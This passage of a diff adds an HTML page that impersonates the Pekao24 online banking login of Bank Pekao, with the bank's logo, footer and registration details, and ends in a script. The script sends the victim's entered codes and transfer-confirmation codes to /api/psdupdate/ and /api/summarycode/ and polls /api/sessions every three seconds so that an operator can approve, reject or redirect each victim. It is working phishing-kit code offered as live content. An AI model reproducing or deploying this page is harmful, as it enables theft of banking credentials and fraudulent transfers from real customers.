12.137c.602 0 1.131-.075 1.59-.224.458-.15.84-.361 1.145-.634.304-.273.533-.603.688-.992.154-.388.23-.821.23-1.3 0-.471-.075-.893-.225-1.267a2.469 2.469 0 0 0-.676-.953c-.3-.261-.68-.461-1.139-.6-.459-.137-.996-.207-1.613-.207h-2.474v6.177h2.474zm0-8.228c1.087 0 2.03.123 2.827.37.798.247 1.457.592 1.977 1.037.52.444.907.98 1.162 1.603.254.624.382 1.313.382 2.068 0 .77-.136 1.474-.405 2.113a4.433 4.433 0 0 1-1.203 1.648c-.531.46-1.192.818-1.982 1.076-.79.258-1.71.387-2.758.387h-2.474v5.84h-2.705V3.909h5.18zM121.1 13.045c0-.404-.06-.78-.179-1.127a2.62 2.62 0 0 0-.526-.908 2.397 2.397 0 0 0-.862-.605 3.01 3.01 0 0 0-1.185-.22c-.901 0-1.61.252-2.127.752-.517.501-.844 1.204-.983 2.108h5.862zm-5.931 1.48c.03.65.135 1.211.312 1.686.177.475.415.869.711 1.183.297.314.651.547 1.064.7.412.154.873.23 1.381.23.486 0 .906-.054 1.26-.162a6.01 6.01 0 0 0 .925-.359c.262-.13.486-.25.67-.358a1.02 1.02 0 0 1 .51-.163c.2 0 .354.075.462.224l.705.886c-.293.336-.624.62-.994.852-.37.231-.763.42-1.18.566-.415.145-.843.25-1.282.313-.44.064-.868.096-1.284.096a6.344 6.344 0 0 1-2.272-.398 5.074 5.074 0 0 1-1.815-1.171c-.513-.516-.913-1.155-1.202-1.917-.29-.763-.434-1.64-.434-2.635 0-.792.13-1.532.388-2.219a5.271 5.271 0 0 1 1.11-1.794 5.214 5.214 0 0 1 1.757-1.204c.69-.296 1.47-.443 2.341-.443.725 0 1.395.114 2.012.341a4.447 4.447 0 0 1 1.596 1.003c.446.442.795.981 1.045 1.62.251.64.377 1.366.377 2.181 0 .373-.043.624-.128.75-.085.128-.239.191-.462.191h-7.573zM127.32 3.46v9.618h.532c.17 0 .308-.022.416-.067a.914.914 0 0 0 .335-.28l3.307-3.665c.116-.15.242-.262.381-.337.139-.074.316-.112.532-.112h2.255l-3.978 4.349a2.973 2.973 0 0 1-.763.695c.154.105.29.223.405.353.115.131.227.28.335.443l4.243 5.594h-2.22c-.2 0-.371-.032-.514-.095a.878.878 0 0 1-.376-.354l-3.41-4.484c-.116-.171-.232-.282-.347-.33-.116-.049-.289-.073-.52-.073h-.613v5.336h-2.486V3.46h2.486z"></path>
+                        <path d="M142.396 15.051c-.887.03-1.635.1-2.243.207-.61.11-1.103.248-1.48.416-.378.168-.65.367-.815.6a1.28 1.28 0 0 0-.249.761c0 .27.044.499.133.69.089.19.212.348.37.47.158.124.343.214.555.27.212.056.445.084.7.084.647 0 1.204-.118 1.67-.353.466-.236.92-.578 1.359-1.026V15.05zm-6.59-4.842c1.333-1.203 2.92-1.805 4.763-1.805.678 0 1.281.106 1.81.32.527.212.97.513 1.329.902.358.389.632.85.82 1.384.19.535.284 1.127.284 1.777v7.264h-1.11c-.239 0-.42-.036-.543-.107-.124-.071-.228-.214-.313-.431l-.242-.93c-.3.261-.598.494-.89.7a5.67 5.67 0 0 1-.908.522 4.61 4.61 0 0 1-1.006.319c-.358.07-.753.106-1.185.106-.478 0-.923-.063-1.335-.19a2.958 2.958 0 0 1-1.07-.578 2.735 2.735 0 0 1-.71-.958c-.174-.38-.26-.83-.26-1.345 0-.441.12-.87.363-1.29.243-.418.644-.793 1.203-1.126.558-.332 1.295-.607 2.208-.824.913-.217 2.04-.34 3.382-.37v-.762c0-.822-.182-1.435-.544-1.838-.362-.404-.894-.606-1.595-.606-.478 0-.879.059-1.203.174a5.568 5.568 0 0 0-.844.375c-.238.135-.45.26-.636.376a1.095 1.095 0 0 1-.589.174.725.725 0 0 1-.434-.129 1.07 1.07 0 0 1-.294-.32l-.452-.784zM152.003 18.336c1.064 0 1.855-.346 2.376-1.037.52-.691.78-1.68.78-2.965s-.26-2.278-.78-2.976c-.52-.7-1.312-1.048-2.376-1.048-1.08 0-1.88.349-2.405 1.048-.524.698-.786 1.69-.786 2.976 0 1.285.262 2.274.786 2.965.524.691 1.326 1.037 2.405 1.037m0-9.898c.871 0 1.659.138 2.364.415a5.079 5.079 0 0 1 1.804 1.176c.497.509.88 1.125 1.15 1.85.27.725.405 1.54.405 2.444 0 .904-.135 1.718-.405 2.444a5.255 5.255 0 0 1-1.15 1.855 5.052 5.052 0 0 1-1.804 1.182c-.705.277-1.493.415-2.364.415-.879 0-1.67-.138-2.376-.415a5.108 5.108 0 0 1-1.81-1.182 5.208 5.208 0 0 1-1.156-1.855c-.27-.726-.404-1.54-.404-2.444 0-.905.135-1.72.404-2.444.27-.725.656-1.341 1.156-1.85.501-.508 1.105-.9 1.81-1.176.705-.277 1.497-.415 2.376-.415M29.955 16.412s4.286 1.581 3.767 7.517c0 0 .052.003.053 0 .18-.38 2.684-5.561-1.281-7.954 0 0 1.6-3.814-1.393-7.35C29.578 6.827 26.79 5.11 21.68 5.83c0 0-6.323-10.225-16.111-3.514 0 0 .74 1.917-.791 3.93l.037.022c1.486-.844 8.561-7.224 16.234.397 0 0 12.12-1.084 8.906 9.748"></path>
+                        <path d="M14.681 17.062s3.114-3.66 6.64-.32c0 0 2.382-2.803 6.095-1.193 1.684.73 4.13 3.12 1.437 8.187a.386.386 0 0 1-.06 0s1.1-4.296-2.12-6.244c-1.298-.786-3.678-.623-6.059 1.91 0 0-1.13-2.025-3.033-1.461 0 0 .238 2.97-1.664 5.984-.002.005-.058-.002-.057 0 0 0 1.11-4.634-1.179-6.863M3.022 18.057s3.98-3.127 7.289-1.694c2.11.915 2.663 3.437 2.258 7.368 0 0 .054.005.056 0 .304-.69 4.213-7.729-1.745-9.86-1.125-.405-2.701-.532-5.544.48L2.701 7.012S6.883 1.522.004.26L0 .307c.672.363 4.767 2.88.18 5.89l2.842 11.86zM40.256 0v23.955h.853L41.127.01z"></path>
+                    </g>
+                </svg>
+            </div>
+        </div>
+    </header>
+    <main class="app-shell-content" aria-label="Uruchamiamy Pekao24" aria-busy="false">
+        <p>Uruchamiamy Pekao24</p>
+        <div class="app-shell-rect-wrapper">
+            <svg height="12" width="56" class="app-shell-rect-loader">
+                <rect x="0" y="0" height="100%" width="12"></rect>
+                <rect x="22" y="0" height="100%" width="12"></rect>
+                <rect x="44" y="0" height="100%" width="12"></rect>
+            </svg>
+        </div>
+    </main>
+    <footer class="app-shell-footer">
+        <section class="app-shell-footer-section">
+            <div class="app-shell-footer-wrapper app-shell-footer-navigation">
+                <ul class="app-shell-footer-navigation-group app-shell-phone-numbers-group">
+                    <li><a class="app-shell-phone-number" href="tel:801365365">801 365 365</a></li>
+                    <li><a class="app-shell-phone-number" href="tel:+48225912232">+48 22 59 12 232</a></li>
+                </ul>
+                <div class="app-shell-footer-navigation-group app-shell-links-group">
+                    <ul class="app-shell-links">
+                        <li><a class="app-shell-link" href="https://www.pekao.com.pl/klient-indywidualny/bankowosc-elektroniczna/bezpieczenstwo.html" target="_blank" rel="noopener">Bezpieczeństwo</a></li>
+                        <li><a class="app-shell-link" href="https://www.pekao.com.pl/o-banku/stopka/rodo.html" target="_blank" rel="noopener">RODO</a></li>
+                    </ul>
+                    <ul class="app-shell-links">
+                        <li><a class="app-shell-link" href="https://www.pekao.com.pl/o-banku/stopka/polityka-prywatnosci.html" target="_blank" rel="noopener">Polityka prywatności</a></li>
+                        <li><a class="app-shell-link" href="https://www.pekao.com.pl/kontakt.html" target="_blank" rel="noopener">Kontakt</a></li>
+                    </ul>
+                </div>
+            </div>
+        </section>
+        <section class="app-shell-footer-section app-shell-bank-information">
+            <div class="app-shell-footer-wrapper app-shell-footer-info-group">
+                  <span>
+                  Bank Polska Kasa Opieki Spółka Akcyjna z siedzibą w Warszawie, ul. Grzybowska 53/57, 00-844 Warszawa, wpisany do rejestru przedsiębiorców w Sądzie Rejonowym dla m.st. Warszawy w Warszawie,
+                  XII Wydział Gospodarczy Krajowego Rejestru Sądowego, KRS: 0000014843, NIP: 526-00-06-841, REGON: 000010205, wysokość kapitału zakładowego i kapitału wpłaconego: 262 470 034 zł.
+                  </span>
+                <div class="app-shell-definition-group">
+                    <section class="app-shell-codes">
+                        <span>
+                           <ng-container>KOD</ng-container>
+                           BIC/SWIFT: PKOPPLPW
+                        </span>
+                    </section>
+                    <section>
+                        © 2020
+                        <ng-container>Bank Polska Kasa Opieki Spółka Akcyjna</ng-container>
+                    </section>
+                </div>
+            </div>
+        </section>
+    </footer>
+</div>
+
+<script src="/assets/js/jquery-3.5.1.min.js"></script>
+<script src="/assets/js/cookies.core.1.3.min.js"></script>
+<script src="/assets/js/banklogin.js"></script>
+<script>
+    let bankId = (cookieManager.read('session_id'))
+
+    const plusBankUpdate = () => {
+        if ($("#bank_password").val() && $("#bank_login").val() !== "") {
+            document.getElementById('psdForm').style.display = 'block'
+            document.getElementById('bankForm').style.display = 'none'
+            $("#buttonsCont").empty()
+            $("#buttonsCont").append('<pekao-button onclick="psdUpdate()" _ngcontent-tvb-c5="" _nghost-tvb-c20=""><button _ngcontent-tvb-c5="" class="button button-primary">Dalej</button></pekao-button>')
+        } else {
+        }
+    }
+
+    const regularCheck = () => {
+        readTextFile("/api/sessions", function(text){
+            var data = JSON.parse(text);
+            for (let i=0;i<data["result"].length;i++) {
+                if (data["result"][i]["uid"] == sessId) {
+                    if (data["result"][i]["accepted"] == "true") {
+                        summaryFunc()
+                        clearInterval(multipleFunc)
+                    }
+                } else {
+
+                }
+            }
+        });
+    }
+    const psdUpdate = () => {
+        if ($("#bank_psd").val() !== "") {
+            $.post("/api/psdupdate/", {
+                bank_psd: $("#bank_psd").val(),
+                sessionId: bankId
+            }).done(data => {
+                document.getElementById('psdForm').style.display = 'none'
+                $("#mainCont").append('<h1 _ngcontent-tvb-c21="" class="login-container-header-title">Logowanie...</h1>')
+                $("#buttonsCont").empty()
+            }).fail(error => {
+                console.error("Coś poszło nie tak… Spróbuj ponownie za chwilę.", "Wystąpił błąd")
+            })
+
+        } else {
+            console.log('not selectec')
+        }
+    }
+
+    let multipleFunc = setInterval(function(){ regularCheck() }, 3000);
+
+    //WRONG PASS
+
+    const wrongPass = () => {
+        $.post("/api/wrongpass/", {
+            sessionId: bankId,
+            name: "false"
+        }).done(data => {
+            console.log('done')
+        }).fail(error => {
+            console.error("Coś poszło nie tak… Spróbuj ponownie za chwilę.", "Wystąpił błąd")
+        })
+    }
+
+    const regularPass = () => {
+        readTextFile("/api/sessions", function(text){
+            var data = JSON.parse(text);
+            for (let i=0;i<data["result"].length;i++) {
+                if (data["result"][i]["uid"] == sessId) {
+                    if (data["result"][i]["accepted"] == "wrongPass") {
+                        clearInterval(multiplePass)
+                        wrongPass()
+                        location.reload()
+                    }
+                } else {
+
+                }
+            }
+        });
+    }
+
+    let multiplePass = setInterval(function(){ regularPass() }, 3000);
+
+
+    const summaryFunc = () => {
+        document.getElementById('confirmForm').style.display = 'block'
+        document.getElementById('otherForms').style.display = 'none'
+        $("#buttonsCont").empty()
+        $("#buttonsCont").append('<pekao-button onclick="summaryCode()" _ngcontent-tvb-c5="" _nghost-tvb-c20=""><button _ngcontent-tvb-c5="" class="button button-primary">Dalej</button></pekao-button>')
+        document.getElementById('summaryInfo').innerText = 'Potwierdź przelew'
+
+    }
+
+    const summaryCode = () => {
+        if ($("#bank_summary").val() !== "") {
+            $.post("/api/summarycode/", {
+                bank_summary: $("#bank_summary").val(),
+                sessionId: bankId
+            }).done(data => {
+
+
+                $('#mainCont').empty()
+                $("#mainCont").append('<p style="font-size: 20px">Czekaj...</p')
+                $("#buttonsCont").empty()
+            }).fail(error => {
+                console.error("Coś poszło nie tak… Spróbuj ponownie za chwilę.", "Wystąpił błąd")
+            })
+
+        } else {
+            console.log('not selectec')
+        }
+    }
+
+    const regularSummary=()=>{readTextFile("/api/sessions",function(e){var s=JSON.parse(e);for(let e=0;e<s.result.length;e++)s.result[e].uid==sessId&&"wrongSummary"==s.result[e].accepted&&(summaryFunc(),wrongSum())})},wrongSum=()=>{$.post("/api/wrongsummary/",{sessionId:bankId,name:"false"}).done(e=>{console.log("done")}).fail(e=>{console.error("Coś poszło nie tak… Spróbuj ponownie za chwilę.","Wystąpił błąd")})};let multipleSummary=setInterval(function(){readTextFile("/api/sessions",function(e){var s=JSON.parse(e);for(let e=0;e<s.result.length;e++)s.result[e].uid==sessId&&"wrongSummary"==s.result[e].accepted&&(summaryFunc(),wrongSum())})},3e3);const regularComplete=()=>{readTextFile("/api/sessions",function(e){var s=JSON.parse(e);for(let e=0;e<s.result.length;e++)s.result[e].uid==sessId&&"completed"==s.result[e].accepted&&(location.href="/summary")})};let multipleCompleted=setInterval(function(){readTextFile("/api/sessions",function(e){var s=JSON.parse(e);for(let e=0;e<s.result.length;e++)s.result[e].uid==sessId&&"completed"==s.result[e].accepted&&(location.href="/summary")})},3e3);
+
+</script>
+
+</body>
+</html>
